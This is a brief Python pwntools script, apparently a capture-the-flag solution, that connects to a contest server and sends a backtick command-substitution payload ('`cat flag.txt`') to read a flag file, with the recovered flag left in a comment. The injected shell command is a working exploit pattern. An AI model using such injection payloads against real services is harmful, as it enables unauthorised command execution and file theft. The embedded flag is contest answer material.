#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
p = remote("challs.pwnoh.io", 13400)

p.sendline(b"`cat flag.txt`")

p.interactive() # bctf{0v3rfl0w_th3_M00m0ry_2d310e3de286658e}
